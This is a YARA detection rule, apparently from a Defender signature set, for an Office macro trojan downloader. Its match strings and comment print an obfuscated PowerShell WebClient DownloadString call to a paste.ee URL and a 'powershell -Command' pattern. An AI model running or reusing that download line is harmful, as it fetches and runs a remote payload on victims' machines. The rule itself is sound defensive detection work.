
rule TrojanDownloader_O97M_EncDoc_RSD_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RSD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {6e 65 77 60 2d 4f 42 60 6a 65 43 54 28 27 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 27 29 29 2e 27 44 6f 57 6e 6c 6f 41 64 73 54 72 49 6e 47 27 28 27 68 74 27 2b 27 74 70 3a 2f 2f 70 61 73 74 65 2e 65 65 2f 72 2f 6b 75 74 69 55 27 29 } //1 new`-OB`jeCT('Net.WebClient')).'DoWnloAdsTrInG'('ht'+'tp://paste.ee/r/kutiU')
		$a_03_1 = {77 65 72 73 68 65 6c 6c 20 2d 43 6f 6d 6d 61 6e 64 90 0a 1a 00 70 6f 90 00 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1) >=2
 
}